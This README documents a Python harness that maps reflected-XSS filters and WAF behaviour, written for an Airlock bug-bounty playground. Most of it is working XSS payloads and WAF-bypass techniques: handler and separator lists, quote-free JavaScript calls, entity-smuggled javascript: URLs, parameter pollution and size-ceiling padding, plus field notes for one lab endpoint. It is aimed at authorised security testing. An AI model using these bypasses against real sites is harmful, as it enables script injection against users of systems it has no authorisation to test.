# xss-waf-probe

A filter-mapping harness for reflected-XSS WAF testing, written for the
Airlock bug-bounty playground (`*.bugbounty.airlock.com`).

> **Scope.** Only run this against a target you are authorised to test.
> Airlock's playground hosts are in scope by design; nothing else here is.
> The default 0.3 s delay is deliberate — do not remove it against a live host.

## Why not just fire payloads?

On a `xss-strict` style challenge, throwing a payload list at the endpoint
tells you almost nothing, because **two independent things** can stop you and
a failed payload does not say which:

| Obstacle | Who does it | What you see | How you beat it |
|---|---|---|---|
| The **WAF** rejects the request | Airlock, before PHP runs | block page / 403 | change the *bytes on the wire* |
| The **app** encodes or strips | the PHP page | `&lt;` in the response | change the *injection context* |

These need opposite responses. Encoding your payload harder defeats a
signature match but does nothing about `htmlspecialchars()`. Switching tags
defeats an encoder but not a WAF that never let the request through.

So map first, exploit second. That is all this tool does: it wraps every
probe in alphanumeric sentinels (`qzwx9l…r9xwzq`), recovers the exact bytes
the app emitted between them, and reports one of:

- `BLOCKED` — WAF ate the request (4xx or your `--block-regex`)
- `RAW` — reached the page byte-for-byte ← **this is what you want**
- `ENCODED` — app transformed it (`'<' -> '&lt;'`)
- `DROPPED` — app silently removed it
- `ABSENT` — served, but nothing reflected (wrong param, or POST not read)

## Run it

```bash
python3 xss_waf_probe.py -u 'https://jw15z.bugbounty.airlock.com/xss-strict/xss-1.php?inject=jj'
```

```bash
# everything, through Burp, with the block page pinned for exact verdicts
python3 xss_waf_probe.py \
  -u 'https://jw15z.bugbounty.airlock.com/xss-strict/xss-1.php?inject=jj' \
  --phase all --proxy 127.0.0.1:8080 --insecure \
  --block-regex 'Request blocked|Reference [0-9a-f]+'
```

Phases: `context` (where does input land), `chars` (per-character map),
`tokens` (keyword signatures), `payloads` (candidate sweep), `transport`
(parser-differential tricks). Stdlib only, Python 3.10+.

**Pin `--block-regex` as soon as you have seen one block page.** Without it
the tool falls back to status codes, and a WAF that blocks with `200` will be
misread as the app encoding you.

## Reading the output

**Phase 1 tells you which game you are playing.** Everything downstream
depends on the reflection context:

- *HTML body* — you need `<` and `>`. If `<` is `ENCODED`, tag injection is
  dead in this context; go hunting for a second reflection point (phase 1
  prints all of them) or a different parameter.
- *Quoted attribute* — you need only the quote character, then a space and an
  event handler. No `<` required. This is the most commonly winnable case.
- *Unquoted attribute* — a bare space plus a handler is enough.
- *Inside `<script>`* — you are in JS. `<` is irrelevant; you need to break a
  string or statement (`'-alert(1)-'`) or close the tag (`</script>`).
- *`href`/`src`* — scheme smuggling: `javascript:` with entities or control
  characters wedged in.

**Phases 2–3 tell you the WAF's shape.** A blocked bare keyword (`onerror`
alone, with no tag around it) means deny-list signature matching, and
signatures are evadable. A `<` that comes back `ENCODED` while everything else
is `RAW` means the WAF is not your problem at all — the app is.

## Composing a bypass

Work from what actually survived, not from a payload list.

**`<` and `>` survive, but tag/handler names are blocked.** Move to markup the
signatures do not cover. In rough order of how often they are missed:

```
<details open ontoggle=…>          <video><source onerror=…>
<marquee onstart=…>                <body onpageshow=…>
<input autofocus onfocus=…>        <select autofocus onfocus=…>
<style onload=…>                   <object data=…>
<form><button formaction=javascript:…>
<div popover id=p onbeforetoggle=…><button popovertarget=p>
<div style=animation-name:x onanimationstart=…>
<div onpointerrawupdate=…>         <xmp><img …>
```

The newer handlers (`onbeforetoggle`, `onpointerrawupdate`, `onscrollend`,
`oncontentvisibilityautostatechange`) postdate a lot of rulesets.

**The tag name is fine but `tag onload` is blocked as a unit.** Fuzz the
separator — HTML accepts far more than a space:

```
<svg/onload=…>     <svg//onload=…>    <svg/x=y onload=…>
<svg%09onload=…>   <svg%0aonload=…>   <svg%0conload=…>   <svg%0donload=…>
<img/src/onerror=…>
```

**`alert` or `(` is blocked.** The call does not need either:

```
alert`1`                     top['ale'+'rt'](1)
window[atob('YWxlcnQ=')](1)  alert(1)
Function`alert\x281\x29```   eval(atob('YWxlcnQoMSk='))
```

**Landing in `href`/`src`.** The HTML parser entity-decodes attribute values
*before* the URL parser sees the scheme, and it tolerates control characters
inside the scheme. A WAF matching the literal string `javascript:` misses all
of these:

```
javascript&colon;alert(1)      java&Tab;script:alert(1)
&#106;avascript:alert(1)       &#x6a;avascript&#58;alert&#40;1&#41;
```

**Nothing in the value works.** The bypass may not be in the value at all —
that is what phase 5 is for. A verdict that *changes* between transports means
the WAF's parser and PHP's parser disagree about what the request says:

- **Parameter pollution** — `?inject=benign&inject=payload`. PHP takes the
  last occurrence; a WAF inspecting only the first never sees the payload.
  (Phase 5's `HPP first`/`HPP last` split tells you which end each side reads.)
- **Inspection ceilings** — WAFs stop scanning past a size limit. The
  `+8KB`/`+64KB` padding rows probe for it. In validation this was the row
  that got through while every other transport was blocked.
- **Method and content-type** — an endpoint reachable by POST may be checked
  by a different ruleset than the GET path, and `multipart/form-data` is
  parsed less consistently than `application/x-www-form-urlencoded`.
- **Encoding normalisation** — the phase-2 tail (`%253c`, `%c0%bc`,
  `%ef%bc%9c`, `%00`). If a probe is *not blocked* but the app decodes it to
  `<`, that gap is the whole bug.

## Reflected is not executed

`RAW` means your bytes reached the page. It does not mean script ran. Before
reporting, open the URL in a real browser and confirm execution — a CSP,
quirks-mode parsing, or landing inside `<textarea>`/`<title>` will all give
you a perfect-looking reflection that never fires. For a report, prefer a
harmless proof (`document.title`, a `console.log`) over `alert(1)`, and
capture the full request, the response, and the browser evidence together.

## Field notes: Airlock `xss-strict/xss-1.php`

A real run against the playground established the following. Re-derive it for
your own instance rather than trusting this verbatim — labs differ.

**The WAF denies with `HTTP 303` to an error page, not a 4xx.** Any tool that
only checks for 4xx will read a block as a normal response. `judge()` treats
3xx as a block by default; pass `--redirect-ok` if the app itself redirects.

**The input is echoed into three contexts, and only the third is live:**

```
[0] <textarea name="inject">INPUT</textarea>            display only
[1] <td class="code">&lt;script&gt; var v = INPUT; ...  escaped source listing
[2] <td><script type="text/javascript"> var v = INPUT; </script></td>   LIVE
```

Point 0 is the default measurement point and it is the *wrong* one. Use
`--point 2` so every verdict is read from the live `<script>` block; the
`[points differ: …]` note fires whenever the encodings diverge, which is the
signal that you are measuring the wrong context.

**Point 2 is a bare JavaScript expression slot**, not markup. That reframes the
whole problem:

- `< > " ' &` are entity-encoded, and **HTML entities are not decoded inside
  `<script>`** — so `&apos;` stays six literal characters and string literals
  built with `'` or `"` are unavailable, permanently.
- Every other character tested came back `RAW`: `` ` `` `/` `\` `=` `(` `)`
  `[` `]` `{` `}` `;` `:` `+` `-` `.` `,` and space.
- You do not need the encoded five. The slot already expects an expression,
  so `alert(1)` needs no breakout at all.

Build strings without quotes — this is the core technique for this context:

| Need | Quote-free form |
|---|---|
| a string | `` `alert(1)` `` (backtick), `/alert/.source`, `String.fromCharCode(97,108,101,114,116)` |
| a call | `alert(1)`, `` alert`1` ``, `(alert)(1)`, `[1].map(alert)` |
| `eval` | `` [].constructor.constructor(`alert(1)`)() ``, `` Function(`alert(1)`)() `` |
| concat | `` `ale`+`rt` `` |

`--payload-set js` sweeps 32 such payloads. `--payload-set html` keeps the
markup corpus for contexts where tag injection is the goal.

**The WAF signatures `\u` escapes.** A bare `\u0061` probe was denied, so
`\u0061lert(1)` will be too — do not burn requests on identifier-escape
variants against this ruleset.

## Files

- `xss_waf_probe.py` — the harness (no dependencies)
- `README.md` — this file

Validated end-to-end against a local mock (reflecting endpoint + signature
WAF with an inspection ceiling); the mock is not committed.
